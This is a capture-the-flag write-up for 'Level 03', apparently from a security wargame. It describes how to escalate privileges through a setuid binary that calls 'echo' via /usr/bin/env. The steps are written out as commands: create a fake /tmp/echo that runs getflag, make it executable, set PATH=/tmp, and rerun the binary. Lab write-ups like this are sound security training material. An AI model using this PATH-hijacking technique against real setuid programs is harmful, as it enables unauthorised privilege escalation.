## LEVEL 03

As usual, we search for files that we can use.  
-> `ls -la` or `la`  
We can see that we have one file named *level03*. It seems to be an executable and it has the permission *'s'* instead of *'x'*.

> The **'s'** permission makes that the file will always be executed with the owner that owns the executable.

Then, we try to launch *level03*.  
-> `./level03`  
It prints *"Exploit me"*. Let's see what's inside the executable.  
-> `cat level03`  
As we can see, it contains a lot of text with printable and unprintable characters.

> **strings** is a command that lists all the printable character in a file.

Next, we filter all the printable character in the file.  
-> `strings level03`  
We can notice the command line `/usr/bin/env echo Exploit me` that prints the string we previously saw.

> **/usr/bin/env** followed by a program name will search that program using the *$PATH* variable and execute it.

Thus, we can exploit the executable by creating a file named *echo* containing `getflag` and change *$PATH* to that file.  
-> `echo /bin/getflag > /tmp/echo`  
-> `chmod +x /tmp/echo`  
-> `export PATH=/tmp`  
-> `./level03`  
Finally, we get our flag.  
-> `su level04`